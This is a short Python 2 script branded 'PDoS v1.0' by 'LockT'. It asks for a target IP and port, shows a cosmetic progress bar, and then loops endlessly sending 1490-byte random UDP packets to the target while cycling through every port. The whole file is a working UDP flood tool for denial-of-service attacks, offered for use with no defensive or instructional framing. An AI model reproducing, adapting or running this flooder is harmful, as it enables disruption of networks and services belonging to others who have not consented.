import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
clscom = "clear"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system(clscom)

print
print "       ____  ____       _____"
print "      / __ \/ __ \____ / ___/"
print "     / /_/ / / / / __ \\__ \ "
print "    / ____/ /_/ / /_/ /__/ / "
print "   /_/   /_____/\____/____/  "
print
print
print "   Made by LockT"
print "   PDoS v1.0"
print
ip = raw_input("   IP    .: ")
port = input("   Port  .: ")


os.system(clscom)
print "   [                    ] 0% "
time.sleep(0.2)
os.system(clscom)
print "   [==                  ] 15% "
time.sleep(0.2)
os.system(clscom)
print "   [=====               ] 25%"
time.sleep(0.2)
os.system(clscom)
print "   [=======             ] 35%"
time.sleep(0.2)
os.system(clscom)
print "   [==========          ] 50%"
time.sleep(0.2)
os.system(clscom)
print "   [============        ] 65%"
time.sleep(1)
os.system(clscom)
print "   [===============     ] 75%"
time.sleep(0.2)
os.system(clscom)
print "   [=================   ] 85%"
time.sleep(0.2)
os.system(clscom)
print "   [====================] 100%"
time.sleep(3)
os.system(clscom)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "   [Packets: %s | packet to %s throught port:%s]"%(sent,ip,port)
     if port == 65534:
       port = 1
